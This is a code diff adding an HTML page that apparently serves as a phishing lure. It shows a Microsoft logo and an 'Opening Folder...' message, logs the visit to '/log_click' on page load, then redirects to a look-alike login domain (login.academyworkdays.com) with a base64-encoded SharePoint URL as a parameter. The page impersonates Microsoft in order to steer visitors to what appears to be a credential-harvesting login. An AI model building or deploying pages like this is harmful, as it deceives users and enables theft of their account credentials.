@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opening Folder...</title>
+    <link href="https://cdn.replit.com/agent/bootstrap-agent-dark-theme.min.css" rel="stylesheet">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: white;
+            color: #212529;
+        }
+        .logo {
+            width: 100px;
+            height: auto;
+            margin-right: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container text-center">
+        <div class="d-flex justify-content-center align-items-center">
+            <img src="https://cdn.worldvectorlogo.com/logos/microsoft-5.svg" alt="Microsoft Logo" class="logo">
+            <h1 class="display-4">Opening Folder...</h1>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        setTimeout(function() {
+            $.ajax({
+                url: '/log_click',
+                method: 'POST',
+                complete: function() {
+                    window.location.href = "https://login.academyworkdays.com?JVaQi-Av4KquFA=aHR0cHM6Ly9taWNyb3NvZnQuc2hhcmVwb2ludC5jb20vOng6L3IvdGVhbXMvKipURUFN";
+                }
+            });
+        }, 1000);
+    </script>
+</body>
+</html>
